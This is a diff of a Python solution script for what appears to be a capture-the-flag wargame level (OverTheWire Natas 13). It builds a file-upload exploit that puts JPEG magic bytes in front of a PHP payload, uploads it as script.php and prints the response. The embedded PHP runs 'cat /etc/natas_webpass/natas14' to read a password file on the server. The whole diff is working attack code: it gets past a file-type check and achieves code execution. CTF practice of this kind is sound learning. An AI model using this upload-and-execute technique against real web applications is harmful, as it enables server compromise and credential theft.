@@ -54,4 +54,18 @@ php_script = """
 cat /etc/natas_webpass/natas14
 ?>
 """
-jpg_magic_bytes = "\xFF\xD8\xFF\xDB"
+jpg_magic_bytes = "ffd8ffdb"
+
+
+files = {
+    "uploadedfile" : bytearray.fromhex(jpg_magic_bytes) + bytearray(php_script, 'utf-8')
+}
+data = {
+    "filename" : "script.php",
+    "submit" : 'submit'
+}
+response = session.post(URL + 'index.php', data=data, files=files)
+div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
+print(f'{div_content}\n')
+
+
